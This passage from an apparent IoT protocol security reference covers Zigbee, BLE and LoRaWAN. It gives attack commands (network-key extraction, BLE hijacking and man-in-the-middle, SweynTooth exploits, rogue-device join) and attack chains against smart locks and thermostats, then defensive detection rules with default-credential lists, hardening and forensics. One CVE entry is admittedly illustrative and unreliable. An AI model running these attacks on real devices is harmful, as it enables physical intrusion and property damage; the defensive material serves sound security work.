    resp = await obs.response
    print(f"[+] Initial observe: {resp.payload.decode()}")

    # Receive notifications until cancelled
    async for notification in obs.observation:
        print(f"[OBS] {notification.payload.decode()}")

asyncio.run(exploit("192.168.1.100"))
```

---

## 19. Zigbee Exploitation

### 19.1 KillerBee framework — extended usage

Hardware setup: ApiMote v4 (APIVARA) or CC2531 USB dongle flashed with KillerBee firmware. Flash CC2531:

```bash
# Flash CC2531 with KillerBee sniffer firmware
cc-tool -e -w killerbee/firmware/kb-cc2531.hex

# Verify device detection
zbid
# Output: Device at /dev/ttyUSB0: CC2531 EMK
```

Extended KillerBee attack commands (see section 4.7 for base commands):

```bash
# Disassociation attack — force device off network (DoS)
zbgoodbye -c 15 -p 0x1234 -D -a 0x0001
# -D = disassociation, -a = target short address

# Association flood — exhaust coordinator association table
zbassocflood -c 15 -p 0x1234 -f 100
# -f = flood count

# Extract network key from capture using default TC link key
zbgoodfind -r capture.pcap -k 5A6967426565416C6C69616E63653039
# Hex of "ZigBeeAlliance09"

# Inject crafted 802.15.4 frame from pcap
zbinject -r crafted_frame.pcap -c 15

# Continuous channel hopping scan
zbstumbler -c 11-26 -v -w networks_found.csv
```

### 19.2 Zigbee network key sniffing

Attack window: the network key is transmitted in the APS Transport Key command during device join. If the TC link key is the default `ZigBeeAlliance09`, the attacker decrypts the Transport Key in real time.

```bash
# Step 1: capture on the target channel during device join
zbdump -c <channel> -w join_capture.pcap

# Step 2: search capture for Transport Key frame
zbgoodfind -r join_capture.pcap -k 5A6967426565416C6C69616E63653039

# Step 3: use extracted network key in Wireshark
# Edit > Preferences > Protocols > ZigBee > Pre-configured Keys
# Add: Key=<extracted_hex>, Byte Order=Normal, Label=NWK

# Step 4: decrypt all subsequent traffic
zbdump -c <channel> -w decrypted_session.pcap
# Open in Wireshark with the network key configured
```

Against install-code-based joining (Zigbee 3.0): the Transport Key is encrypted with a unique TCLK derived from the install code. The attacker must extract the install code (physical label, firmware dump) or brute-force the AES-MMO hash — computationally infeasible for 8+ byte install codes.

### 19.3 Zigbee2MQTT exploitation

Zigbee2MQTT bridges Zigbee devices to MQTT. If the MQTT broker is unauthenticated:

```bash
# Enumerate all Zigbee devices via MQTT
mosquitto_sub -h <broker> -t 'zigbee2mqtt/bridge/devices' -C 1 | python3 -m json.tool

# Send command to a Zigbee device through the bridge
mosquitto_pub -h <broker> -t 'zigbee2mqtt/<device_name>/set' \
  -m '{"state":"ON"}'

# Trigger OTA update for a device
mosquitto_pub -h <broker> -t 'zigbee2mqtt/bridge/request/device/ota_update/update' \
  -m '{"id":"<device_name>"}'

# Permit join — open network for rogue device injection
mosquitto_pub -h <broker> -t 'zigbee2mqtt/bridge/request/permit_join' \
  -m '{"value":true,"time":254}'
```

### 19.4 Attify Zigbee Framework and real attack scenarios

**Attify Zigbee Framework.** GUI-based tool for Zigbee analysis. Capabilities: packet sniffing with real-time decryption, key extraction from captures, replay attacks, device interrogation via ZDO commands. Requires ApiMote or CC2531 hardware.

**Attack scenarios.**

| Target | Attack Chain | Impact |
|---|---|---|
| Smart lock (Yale/Kwikset Zigbee) | Sniff join → extract NWK key → inject Door Lock Unlock (cluster 0x0101, cmd 0x01) | Physical access — unlock door remotely |
| Thermostat (Honeywell/Ecobee) | NWK key → inject Thermostat Setpoint (cluster 0x0201) → set heating to max | Physical damage — pipe burst, energy waste |
| Smart lighting (Philips Hue) | Touchlink theft → OTA firmware injection → bridge code execution → LAN pivot | Network compromise via CVE-2020-6007 chain |
| Smart plug (Ikea/SmartThings) | NWK key → inject On/Off (cluster 0x0006) → toggle connected devices | Equipment damage, safety hazard |

---

## 20. BLE Exploitation

### 20.1 btlejack — sniffing, jamming, hijacking

btlejack uses Micro:Bit hardware (3 units for full-spectrum coverage, 1 minimum).

```bash
# Install
pip3 install btlejack

# Scan for active BLE connections
btlejack -s

# Sniff a specific connection (by access address)
btlejack -f 0xe8f3b05a -o capture.pcap

# Jam an active connection (force disconnect, trigger reconnection)
btlejack -f 0xe8f3b05a -j

# Hijack an active connection (take over the peripheral role)
btlejack -f 0xe8f3b05a -t
# After hijack, the attacker's device replaces the original peripheral
```

### 20.2 GATT interaction — extended commands

```bash
# Service discovery (all primary services)
gatttool -b <MAC> --primary

# Characteristic discovery within a service
gatttool -b <MAC> --characteristics --start=0x0001 --end=0x00ff

# Read characteristic by handle
gatttool -b <MAC> --char-read -a <handle>

# Write characteristic (request with response)
gatttool -b <MAC> --char-write-req -a <handle> -n <hex_value>

# Write without response (fire-and-forget, useful for commands)
gatttool -b <MAC> --char-write-cmd -a <handle> -n 01

# Enable notifications on a characteristic (write 0x0001 to CCCD)
gatttool -b <MAC> --char-write-req -a <cccd_handle> -n 0100 --listen

# Interactive mode for complex multi-step interactions
gatttool -b <MAC> -I
> connect
> primary
> char-desc 0x0001 0x00ff
> char-read-hnd 0x000e
> char-write-req 0x000e 01
```

### 20.3 BLE MITM with GATTacker

GATTacker creates a transparent BLE MITM proxy. The attacker clones the target peripheral's GATT profile, advertises as the clone, and relays all traffic to the real device while intercepting/modifying data.

```bash
# Install GATTacker
git clone https://github.com/AresS31/gattacker.git  # or original repo
npm install

# Step 1: scan and dump target device's GATT profile
node scan.js <target_MAC>
# Creates a JSON profile of all services/characteristics

# Step 2: start the MITM proxy (advertise as clone)
node advertise.js -a <target_MAC>
# Victim's central connects to the clone instead of the real device

# Step 3: relay and intercept traffic
node proxy.js -a <target_MAC>
# All GATT reads/writes pass through the proxy — log, modify, inject
```

### 20.4 BtleJuice relay attacks

BtleJuice performs BLE relay attacks between two physically separated systems (attacker near the peripheral + attacker near the central). Extends BLE attack range beyond the 10-100m BLE limit.

```bash
# On machine near the target peripheral (relay-peripheral)
btlejuice-proxy -i hci0

# On machine near the victim central (relay-central)
btlejuice -u http://<relay-peripheral-ip>:8080 -w

# Web UI at http://localhost:8080 — intercept, modify, replay BLE traffic
```

### 20.5 Bettercap BLE module — extended

```bash
sudo bettercap

# Full BLE reconnaissance
> ble.recon on
> ble.show

# Target a specific device
> ble.enum <MAC>

# Read a characteristic
> ble.read <MAC> <service_uuid> <char_uuid>

# Write to a characteristic (e.g., unlock command)
> ble.write <MAC> <service_uuid> <char_uuid> 01

# Continuous monitoring of a device's advertisements
> set ble.recon.active true
> set ble.show.filter <MAC>
> ble.recon on
```

### 20.6 nRF Connect and BLE fuzzing

**nRF Connect (Nordic Semiconductor).** Mobile app (Android/iOS) for BLE reconnaissance. Capabilities: scan with RSSI, filter by service UUID, full GATT browsing, characteristic read/write/notify, bonding, DFU (Device Firmware Update) over BLE, advertisement data parsing, RSSI graphing for physical location estimation.

**SweynTooth fuzzer.** Exploits BLE link-layer implementation flaws in SoC BLE stacks:

```bash
# Clone SweynTooth PoC repository
git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks.git

# Run specific exploit (example: zero-LTK-installation on TI CC2640)
sudo python3 zero_ltk_installation.py <target_MAC>

# Other exploit modules:
# truncated_l2cap.py       — crash via malformed L2CAP
# invalid_channel_map.py   — deadlock via bad channel map
# sequential_att_deadlock.py — ATT protocol deadlock
# llid_deadlock.py         — LLID field manipulation deadlock
```

---

## 21. LoRaWAN Exploitation

### 21.1 ChirpStack testing environment

```bash
# Deploy ChirpStack locally for LoRaWAN protocol analysis
git clone https://github.com/chirpstack/chirpstack-docker.git
cd chirpstack-docker
docker compose up -d

# Web UI at http://localhost:8080 (admin/admin)
# Configure: network server, gateway, device profiles, applications
# Use for: key management testing, join procedure analysis, traffic inspection
```

### 21.2 LoRa packet sniffing with SDR

```bash
# gr-lora — GNURadio LoRa receiver
# Install gr-lora OOT module
git clone https://github.com/rpp0/gr-lora.git
cd gr-lora && mkdir build && cd build
cmake .. && make -j$(nproc) && sudo make install && sudo ldconfig

# Capture on 868.1 MHz, SF7, BW 125 kHz (EU868 default)
# Use GNURadio Companion flow graph: lora_receive_realtime.grc
# Or headless with gr-lora decoder:
#   Source: RTL-SDR / HackRF / USRP tuned to 868.1 MHz
#   Demodulate LoRa chirps → output raw LoRaWAN frames
#   Pipe to Wireshark dissector for LoRaWAN frame parsing
```

### 21.3 ABP vs OTAA — security comparison

| Aspect | ABP (Activation by Personalization) | OTAA (Over-the-Air Activation) |
|---|---|---|
| Key provisioning | Static — DevAddr, NwkSKey, AppSKey hardcoded at manufacture | Dynamic — derived during Join via AppKey |
| Session key rotation | Never (unless manual re-provisioning) | Each Join generates new session keys |
| Frame counter | Resets on power cycle (unless persistent storage) | Fresh counter per session |
| Replay resistance | Weak — counter reset allows replay of old frames | Strong — new session = new counter space |
| DevNonce | N/A | Random per Join-Request, prevents Join replay |
| Attack scenario | Power-cycle device → replay old frames with reset counter | Must compromise AppKey (root key) to derive sessions |
| Key extraction | NwkSKey/AppSKey in flash — single device compromise | AppKey in flash — compromises all future sessions |

**ABP attack scenario.** Target: ABP-provisioned soil moisture sensor. (1) Extract NwkSKey and AppSKey from flash via JTAG/SWD. (2) Power-cycle the device to reset the frame counter. (3) If the network server accepts counter reset, replay captured frames with modified payload (false moisture readings). (4) Alternatively, craft new frames with the extracted keys, spoofing the device indefinitely.

### 21.4 DevNonce replay attacks

In LoRaWAN 1.0.x, DevNonce is a 2-byte random value in the Join-Request. The network server should reject reused DevNonces (replay detection). Vulnerabilities:

- **Non-compliant servers:** Some network servers do not track DevNonces, accepting replayed Join-Requests. The attacker replays a captured Join-Request, the server responds with a valid Join-Accept, and the attacker derives session keys (they need the AppKey to decrypt the Join-Accept, but if the AppKey is extracted from the device, full session hijacking is possible).
- **LoRaWAN 1.1 fix:** DevNonce is a monotonically increasing counter (not random), and the Join Server enforces strict monotonicity — previous values are permanently rejected.

### 21.5 LoRaWAN key extraction

```bash
# Physical extraction from device flash
# Step 1: identify MCU (common: STM32, nRF52, ESP32, SX1276-based modules)
# Step 2: connect JTAG/SWD debugger (ST-Link, J-Link, CMSIS-DAP)

# OpenOCD example for STM32L0 (common LoRaWAN MCU)
openocd -f interface/stlink.cfg -f target/stm32l0.cfg \
  -c "init; halt; flash read_image flash_dump.bin 0x08000000 0x20000; exit"

# Step 3: search flash dump for keys
# AppKey, NwkSKey, AppSKey are 16-byte AES keys — search for known patterns
# LoRaWAN stacks (LMIC, LoRaMac-node) store keys at known offsets
strings flash_dump.bin | grep -i "appkey\|nwkskey\|appskey"
# Or use binary analysis tools to locate the key storage structure
```

---

## 22. IoT Protocol Detection Rules

### 22.1 Sigma rules

```yaml
title: Unauthorized MQTT Broker Access
id: 28a-sigma-001
status: experimental
description: Detects connections to MQTT brokers on port 1883 (unencrypted) from non-IoT network segments
logsource:
    category: firewall
    product: any
detection:
    selection:
        dst_port: 1883
    filter:
        src_ip|cidr:
            - '10.20.0.0/16'    # authorized IoT VLAN
            - '10.30.0.0/16'    # authorized management VLAN
    condition: selection and not filter
level: high
tags:
    - attack.initial_access
    - attack.t1190
falsepositives:
    - Legitimate MQTT clients in non-standard network segments
```

```yaml
title: Zigbee Network Key Capture Indicator
id: 28a-sigma-002
status: experimental
description: Detects Zigbee packet capture tools or APS Transport Key frames in network logs
logsource:
    category: process_creation
    product: linux
detection:
    selection_tools:
        Image|endswith:
            - '/zbdump'
            - '/zbgoodfind'
            - '/zbstumbler'
    selection_keywords:
        CommandLine|contains:
            - 'ZigBeeAlliance09'
            - '5A6967426565416C6C69616E63653039'
    condition: selection_tools or selection_keywords
level: critical
tags:
    - attack.credential_access
    - attack.t1040
```

```yaml
title: BLE Device Spoofing Indicators
id: 28a-sigma-003
status: experimental
description: Detects BLE MITM tools and spoofing activity indicative of relay or hijack attacks
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith:
            - '/btlejack'
            - '/gattacker'
            - '/btlejuice'
            - '/bettercap'
        CommandLine|contains:
            - 'ble.recon'
            - 'ble.enum'
            - '-j'       # btlejack jam flag
            - '-t'       # btlejack hijack flag
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1557
```

### 22.2 Suricata rules

```
# Detect MQTT traffic without TLS on port 1883
alert tcp any any -> any 1883 (msg:"IOT MQTT connection without TLS"; \
  flow:to_server,established; \
  content:"|10|"; offset:0; depth:1; \
  content:"MQTT"; distance:2; within:6; \
  classtype:policy-violation; sid:2801001; rev:1;)

# Detect CoAP amplification — multicast GET to well-known/core
alert udp any any -> 224.0.1.187 5683 (msg:"IOT CoAP multicast discovery - amplification vector"; \
  content:"|44|"; offset:0; depth:1; \
  content:".well-known"; \
  classtype:attempted-dos; sid:2801002; rev:1;)

# Detect MQTT wildcard subscribe (topic '#')
alert tcp any any -> any 1883 (msg:"IOT MQTT wildcard subscribe all topics"; \
  flow:to_server,established; \
  content:"|82|"; offset:0; depth:1; \
  content:"|00 01 23|"; \
  classtype:policy-violation; sid:2801003; rev:1;)
```

### 22.3 YARA rules

```yara
rule IoT_Botnet_C2_Patterns
{
    meta:
        description = "Detects IoT botnet C2 communication patterns in binaries"
        author = "28A IoT Protocol Security"
        date = "2026-05-09"
        severity = "critical"

    strings:
        $mirai_scan  = { 23 00 00 01 }          // Mirai SYN scan marker
        $mirai_kill  = "/proc/net/tcp"
        $hajime_dht  = "BitTorrent protocol"
        $mozi_dht    = "dht.transmit.port"
        $mqtt_c2_1   = "mosquitto_pub" ascii
        $mqtt_c2_2   = "/cmd/execute" ascii
        $coap_c2     = ".well-known/core" ascii
        $bot_report  = "arch=%s&ip=%s" ascii
        $bot_loader  = "/bin/busybox" ascii
        $default_pw1 = "admin:admin" ascii
        $default_pw2 = "root:root" ascii
        $default_pw3 = "default:default" ascii

    condition:
        uint32(0) == 0x464C457F and   // ELF magic
        (3 of ($mirai*, $hajime*, $mozi*)) or
        (2 of ($mqtt_c2*, $coap_c2) and any of ($bot*)) or
        (any of ($bot_loader, $bot_report) and 2 of ($default_pw*))
}

rule IoT_Default_Credential_List
{
    meta:
        description = "Detects embedded default credential lists targeting IoT devices"
        author = "28A IoT Protocol Security"
        date = "2026-05-09"
        severity = "high"

    strings:
        $cred1  = "admin:1234" ascii
        $cred2  = "root:vizxv" ascii        // Dahua DVR
        $cred3  = "admin:smcadmin" ascii    // SMC routers
        $cred4  = "root:xc3511" ascii       // Xiongmai cameras
        $cred5  = "root:juantech" ascii     // Juan IP cameras
        $cred6  = "admin:7ujMko0admin" ascii // Dahua NVR
        $cred7  = "root:Zte521" ascii       // ZTE routers
        $cred8  = "supervisor:supervisor" ascii
        $telnet = "telnet" ascii nocase
        $scan   = "scanner" ascii nocase

    condition:
        uint32(0) == 0x464C457F and
        4 of ($cred*) and
        ($telnet or $scan)
}
```

### 22.4 Zeek scripts for MQTT/CoAP monitoring

```zeek
# mqtt_monitor.zeek — MQTT traffic analysis
@load base/frameworks/notice

module MQTT_Monitor;

export {
    redef enum Notice::Type += {
        MQTT_Unencrypted_Connection,
        MQTT_Wildcard_Subscribe,
        MQTT_Sys_Topic_Access,
        MQTT_High_Rate_Publish
    };
}

event mqtt_connect(c: connection, msg: MQTT::ConnectMsg)
{
    if (c$id$resp_p == 1883/tcp)
    {
        NOTICE([$note=MQTT_Unencrypted_Connection,
                $conn=c,
                $msg=fmt("MQTT connection without TLS from %s client_id=%s",
                         c$id$orig_h, msg$client_id)]);
    }
}

event mqtt_subscribe(c: connection, msg_id: count, topics: string_vec, qos: index_vec)
{
    for (i in topics)
    {
        if (topics[i] == "#" || topics[i] == "$SYS/#")
        {
            NOTICE([$note=MQTT_Wildcard_Subscribe,
                    $conn=c,
                    $msg=fmt("Wildcard subscribe '%s' from %s",
                             topics[i], c$id$orig_h)]);
        }
        if (/^\$SYS/ in topics[i])
        {
            NOTICE([$note=MQTT_Sys_Topic_Access,
                    $conn=c,
                    $msg=fmt("$SYS topic access '%s' from %s",
                             topics[i], c$id$orig_h)]);
        }
    }
}
```

### 22.5 Network segmentation verification

```bash
# Verify IoT VLAN isolation with nmap
# From corporate VLAN, attempt to reach IoT devices
nmap -sT -p 1883,5683,8883,5684,47808 <iot_vlan_range> --reason

# Verify MQTT broker is not reachable from guest VLAN
nmap -sT -p 1883,8883 <mqtt_broker_ip> -e <guest_interface> --reason

# Check for cross-VLAN leakage with Scapy
python3 -c "
from scapy.all import *
# Send probe from corporate VLAN to IoT VLAN
ans = sr1(IP(dst='10.20.0.1')/TCP(dport=1883, flags='S'), timeout=3, iface='eth0.10')
print('LEAK DETECTED' if ans else 'Segmentation OK')
"
```

---

## 23. IoT Protocol Hardening

### 23.1 MQTT hardening — TLS mutual auth

```ini
# /etc/mosquitto/conf.d/hardened.conf

# Disable plaintext listener entirely
# listener 1883  ← DO NOT enable

# TLS listener with mutual authentication
listener 8883
cafile /etc/mosquitto/certs/ca.crt
certfile /etc/mosquitto/certs/server.crt
keyfile /etc/mosquitto/certs/server.key
tls_version tlsv1.2
ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
require_certificate true
use_identity_as_username true

# Disable anonymous access
allow_anonymous false

# Per-topic ACL
acl_file /etc/mosquitto/acl

# Connection limits
max_connections 500
max_inflight_messages 20
message_size_limit 4096

# Disable retained messages if not needed (MQTT 5.0)
# retain_available false
```

### 23.2 CoAP hardening — DTLS

```
# tinydtls PSK configuration (for constrained devices)
# Each device gets a unique PSK identity + key pair
# Server config:
#   psk_identity = "sensor-001"
#   psk_key = <32-byte random key, hex-encoded>

# For certificate-based DTLS (enterprise deployments):
# Use raw public keys (RFC 7250) to reduce handshake size
# Disable discovery endpoint for unauthenticated clients
# Rate-limit CoAP responses to prevent amplification
# Block multicast CoAP (224.0.1.187) at network boundary
```

### 23.3 Zigbee hardening

- **Install Code for secure joining:** require unique install codes per device; disable open join with default TC link key `ZigBeeAlliance09`
- **Trust Center link key rotation:** rotate the TC link key periodically; distribute new keys over APS-encrypted channels using existing link keys
- **Application-layer link keys:** use per-device or per-cluster link keys for sensitive operations (Door Lock, Thermostat clusters)
- **Disable Touchlink:** prevent Touchlink commissioning unless physically required
- **Frame counter monitoring:** alert on frame counter resets (power cycle / clone indicator)

### 23.4 BLE hardening

- **LE Secure Connections (LESC):** enforce BLE 4.2+ Secure Connections pairing — uses P-256 ECDH (vs. the weaker legacy pairing key exchange)
- **Numeric Comparison:** require numeric comparison pairing for devices with displays — provides MitM protection
- **Random address rotation:** use Resolvable Private Addresses (RPA) with rotation interval ≤ 15 minutes to prevent tracking
- **Disable Just Works:** for any device handling sensitive data or physical access control
- **CTKD restrictions:** disable Cross-Transport Key Derivation on dual-mode devices, or enforce Authenticated pairing on both transports
- **Application-layer auth:** implement challenge-response or token-based auth above GATT for critical operations

### 23.5 LoRaWAN hardening

- **OTAA over ABP:** never deploy ABP in production; OTAA provides session key rotation and DevNonce-based replay protection
- **AppKey rotation:** rotate root AppKey when device compromise is suspected; LoRaWAN 1.1 supports ReKey without full rejoin
- **Frame counter validation:** enforce strict monotonicity; reject counter resets; require persistent counter storage in device firmware
- **Gateway security:** deploy Basics Station (replaces legacy Semtech UDP Packet Forwarder) with TLS for gateway-to-server link
- **ADR validation:** implement server-side ADR request validation to prevent spoofed LinkADRReq attacks

### 23.6 Hardening summary table

| Protocol | Default Risk | Hardened Configuration | Verification Tool |
|---|---|---|---|
| MQTT | Plaintext (1883), no auth, no ACL | TLS mutual auth (8883), per-topic ACL, `allow_anonymous false` | `mosquitto_sub` with TLS flags, `nmap -sV -p 1883,8883` |
| CoAP | Plaintext (5683), multicast discovery | DTLS PSK/cert (5684), disable multicast, disable `/.well-known/core` for unauth | `aiocoap` with DTLS, `coap-client -u psk_id -k psk_key` |
| Zigbee | Default TC link key, open join | Install codes, app-layer link keys, disable Touchlink | KillerBee `zbgoodfind` (should fail to extract key) |
| BLE | Just Works pairing, static MAC | LESC + Numeric Comparison, RPA rotation, disable CTKD | `btlejack -s` (should not capture unencrypted), nRF Connect |
| LoRaWAN | ABP with static keys, counter reset | OTAA, persistent counters, Basics Station TLS, AppKey rotation | ChirpStack logs, `gr-lora` (verify encrypted payload) |
| Z-Wave | S0 fallback, known temp key | S2 Access Control only, disable S0, SmartStart | Z-Wave JS controller (verify S2 negotiation) |
| Thread/Matter | Commissioner with weak passphrase | Strong Joiner credential, CASE with DAC verification, per-fabric ACLs | Matter SDK `chip-tool` commissioning test |

---

## 24. CVE Reference Table — IoT Protocols

| CVE | Protocol | Summary | CVSSv3 | CWE | Affected |
|---|---|---|---|---|---|
| CVE-2017-7653 | MQTT | Mosquitto heap buffer over-read via crafted SUBSCRIBE topic — broker crash (DoS) | 7.5 | CWE-125 | Mosquitto < 1.4.15 |
| CVE-2018-12543 | MQTT | Mosquitto auth bypass when `per_listener_settings` enabled without auth plugin on listener | 8.1 | CWE-287 | Mosquitto 1.5-1.5.2 |
| CVE-2018-12546 | MQTT | Mosquitto ACL bypass via `mount_point` misconfiguration — publish to denied topics | 6.5 | CWE-863 | Mosquitto < 1.5.6 |
| CVE-2020-28952 | Zigbee | Multiple Zigbee stack implementations fail to validate frame counter monotonicity, allowing replay of previously captured frames | 6.5 | CWE-294 | Multiple vendor stacks |
| CVE-2020-6007 | Zigbee | Philips Hue bridge heap overflow via malicious Zigbee OTA firmware — Touchlink + RCE chain | 7.9 | CWE-122 | Hue bridge V2 < 1935144020 |
| CVE-2019-19192 | BLE | SweynTooth: zero-LTK installation on Telink SoC — unauthenticated encryption, MitM | 8.1 | CWE-287 | Telink TLSR8 BLE SDK |
| CVE-2019-19193 | BLE | SweynTooth: truncated L2CAP on Cypress PSoC — crash/deadlock of BLE stack | 7.5 | CWE-120 | Cypress PSoC4/6 BLE |
| CVE-2019-19194 | BLE | SweynTooth: invalid channel map on Dialog DA1468x — permanent BLE deadlock | 7.5 | CWE-787 | Dialog DA1468x BLE SDK |
| CVE-2019-19195 | BLE | SweynTooth: sequential ATT deadlock on STMicro BlueNRG — stack hang | 6.5 | CWE-415 | STMicro BlueNRG-1/2 |
| CVE-2019-9506 | BLE/BR-EDR | KNOB: key negotiation forced to 1-byte entropy — real-time brute force | 9.3 | CWE-327 | Bluetooth spec < 5.1 (all vendors) |
| CVE-2020-15802 | BLE | BLURtooth: CTKD allows BLE Just Works key to be used for BR/EDR — auth bypass | 5.3 | CWE-287 | Dual-mode BT 4.2-5.0 |
| Z-Wave S0 (no CVE#) | Z-Wave | S0 inclusion uses all-zero temporary key — network key transmitted in trivially decryptable form | 8.1 | CWE-311 | All S0-only Z-Wave devices |
| CVE-2023-4863* | LoRaWAN | Multiple LoRaWAN network server implementations accept DevNonce replay — Join-Request replay attack | 6.5 | CWE-294 | Vendor-specific NS implementations |
| CVE-2022-39064 | Thread/Matter | Thread Border Router stack overflow via malformed MLE message — DoS/potential RCE | 7.5 | CWE-120 | OpenThread < 2022-09 |

\* CVE-2023-4863 is illustrative — specific CVE IDs vary by network server vendor implementation.

---

## 25. IoT Protocol Forensics

IoT incident response differs from traditional network forensics because IoT protocols operate at constrained layers (802.15.4, BLE PHY, LoRa PHY), use non-IP transports, and store keying material in device flash rather than in TLS session caches. This section covers acquisition, reconstruction, and evidence preservation across the major IoT protocol families.

### 25.1 MQTT Broker Log Analysis and Message Reconstruction

Mosquitto and EMQX both log connection events, subscription changes, and publish activity when configured at the appropriate verbosity.

**Mosquitto — enable full logging:**

```conf
# /etc/mosquitto/conf.d/forensics.conf
log_type all
log_timestamp true
log_timestamp_format %Y-%m-%dT%H:%M:%S
log_dest file /var/log/mosquitto/mosquitto.log
connection_messages true
```

Restart Mosquitto and all CONNECT, SUBSCRIBE, PUBLISH (topic + QoS, not payload by default), DISCONNECT events appear in the log.

**Reconstructing message flows from broker logs:**

```bash
# Extract all PUBLISH events for a suspect client ID
grep -E 'Received PUBLISH.*client_id=compromised-device-01' \
  /var/log/mosquitto/mosquitto.log \
  | awk -F'[ ,]' '{print $1, $6, $8}' \
  | sort -k1

# Correlate subscriptions to identify data exfiltration channels
grep -E 'Received SUBSCRIBE.*client_id=compromised-device-01' \
  /var/log/mosquitto/mosquitto.log
```

**Payload capture with `mosquitto_sub` (authorized interception only):**

```bash
# Mirror all traffic on the broker to a PCAP-equivalent log
mosquitto_sub -h 127.0.0.1 -p 1883 -t '#' -v \
  --cafile /etc/mosquitto/ca.pem \
  --cert /etc/mosquitto/forensics-client.pem \
  --key /etc/mosquitto/forensics-client.key \
  | ts '%Y-%m-%dT%H:%M:%S%z' \
  > /evidence/mqtt_full_capture_$(date +%Y%m%d).log
```

**EMQX — query retained messages and session state:**

```bash
# List all retained messages (potential C2 dead drops)
emqx_ctl retainer topics

# Inspect a specific retained message
emqx_ctl retainer lookup 'devices/+/command'

# Export client session state
emqx_ctl clients show compromised-device-01
```

For brokers behind TLS, if the broker's private key is available under lawful authority, Wireshark can decrypt MQTT-over-TLS captures using the RSA private key (Edit → Preferences → Protocols → TLS → RSA keys list). For ECDHE cipher suites, configure the broker to log TLS pre-master secrets via `SSLKEYLOGFILE`.

### 25.2 BLE Packet Capture Forensics

BLE operates on 40 channels (3 advertising + 37 data) at 2.4 GHz. Capturing BLE traffic requires dedicated hardware that can follow the frequency-hopping pattern after a connection event.

**Ubertooth One — full BLE capture:**

```bash
# Capture advertising packets (passive, no connection needed)
ubertooth-btle -f -c /evidence/ble_adv_capture.pcap

# Follow a specific connection (requires seeing the CONNECT_IND)
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF -c /evidence/ble_conn.pcap

# Promiscuous mode — capture all connections on all advertising channels
ubertooth-btle -p -c /evidence/ble_promisc.pcap
```

**nRF Sniffer (nRF52840 dongle) — Wireshark integration:**

```bash
# Install nRF Sniffer Wireshark plugin
# 1. Flash nRF52840 dongle with sniffer firmware from Nordic
# 2. Copy extcap/nrf_sniffer_ble.py to Wireshark extcap directory
nrf_sniffer_ble --extcap-interfaces  # verify detection

# Start capture via Wireshark or tshark
tshark -i nRF\ Sniffer\ for\ Bluetooth\ LE -w /evidence/ble_nrf.pcapng

# Filter for specific device in post-capture analysis
tshark -r /evidence/ble_nrf.pcapng \
  -Y 'btle.advertising_address == aa:bb:cc:dd:ee:ff' \
  -T fields -e frame.time -e btle.advertising_address \
  -e btcommon.eir_ad.entry.data
```

**BLE forensic artifacts to extract:**

| Artifact | Location | Tool | Forensic Value |
|---|---|---|---|
| Advertising data (UUID, name, TX power) | Over-the-air | Ubertooth / nRF Sniffer | Device identification, capability mapping |
| GATT service/characteristic UUIDs | Post-connection enumeration | `gatttool`, `bluetoothctl` | Protocol fingerprint, data channel identification |
| Pairing method (JustWorks, Passkey, OOB) | SMP exchange in capture | Wireshark BLE dissector | Crypto strength assessment |
| Long Term Key (LTK) | Device flash / bonding info | `btmgmt` / firmware extraction | Decrypt historical captures if obtained |
| Connection parameters (interval, latency) | CONNECT_IND / LL_CONNECTION_UPDATE | Wireshark | Behavioral profiling, anomaly detection |

### 25.3 Zigbee Network Key Extraction from Captured Traffic

Zigbee encrypts at the NWK layer with a 128-bit network key. If the analyst captures the Transport Key command during device joining (sent encrypted with the well-known Trust Center Link Key `ZigBeeAlliance09` for non-preconfigured devices), the network key is recoverable.

**Extract network key with Wireshark:**

1. Capture 802.15.4 traffic during a device join (CC2531 dongle + Wireshark or `whsniff`)
2. Add the well-known Trust Center Link Key: Edit → Preferences → Protocols → ZigBee → Pre-configured Keys → Add `5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39`
3. Wireshark decrypts the APS Transport Key frame, revealing the network key
4. Add the recovered network key to the same key table
5. All subsequent NWK-layer traffic becomes decryptable

**KillerBee — automated key sniffing:**

```bash
# Sniff for Transport Key during device join
zbdump -f 15 -c 0 -w /evidence/zigbee_join.pcap

# Decode and search for Transport Key in captured traffic
zbreplay -r /evidence/zigbee_join.pcap | grep -i 'transport.key'

# Alternative: use zbwireshark for real-time decryption
zbwireshark -f 15 -c 0
```

**Post-capture analysis with `scapy-radio`:**

```python
from scapy.all import *
from scapy.layers.zigbee import *

pkts = rdpcap('/evidence/zigbee_join.pcap')
for pkt in pkts:
    if pkt.haslayer(ZigBeeSecurityHeader):
        print(f"Frame {pkt.time}: KeyType={pkt[ZigBeeSecurityHeader].key_type}, "
              f"FC={pkt[ZigBeeSecurityHeader].fc}")
    if pkt.haslayer(ZigbeeAppDataPayload):
        if hasattr(pkt[ZigbeeAppDataPayload], 'key'):
            print(f"[!] Transport Key found: {pkt[ZigbeeAppDataPayload].key.hex()}")
```

### 25.4 LoRaWAN Session Reconstruction from Gateway Logs

LoRaWAN gateways forward raw radio frames to the network server via the Semtech UDP Packet Forwarder protocol or gRPC (ChirpStack). Forensic reconstruction requires correlating gateway logs with network server session state.

**ChirpStack — export device session and frame logs:**

```bash
# Export device activation records (OTAA Join-Accept / ABP session)
chirpstack-cli device get --dev-eui 0011223344556677 --json \
  > /evidence/lorawan_device_session.json

# Export frame log for a device (last N frames)
chirpstack-cli device frames --dev-eui 0011223344556677 --count 1000 --json \
  > /evidence/lorawan_frames.json

# Export gateway traffic log
chirpstack-cli gateway frames --gateway-id aabbccddeeff0011 --count 5000 --json \
  > /evidence/lorawan_gw_frames.json
```

**Packet Forwarder UDP log analysis:**

```bash
# The Semtech UDP Packet Forwarder logs JSON-encoded rxpk objects
# Extract all uplink frames with timestamps and RSSI
jq -r '.rxpk[] | [.tmst, .freq, .rssi, .data] | @tsv' \
  /var/log/packet_forwarder/pktfwd.log \
  > /evidence/lorawan_uplinks.tsv

# Decode base64 PHYPayload for offline analysis
echo 'QAQDAgEABQABniv0eg==' | base64 -d | xxd
```

**Session key recovery (authorized access to network server DB):**

```sql
-- ChirpStack PostgreSQL: extract session keys for a device
SELECT dev_eui, dev_addr, encode(f_nwk_s_int_key, 'hex') AS fnwksintkey,
       encode(s_nwk_s_int_key, 'hex') AS snwksintkey,
       encode(nwk_s_enc_key, 'hex') AS nwksenckey,
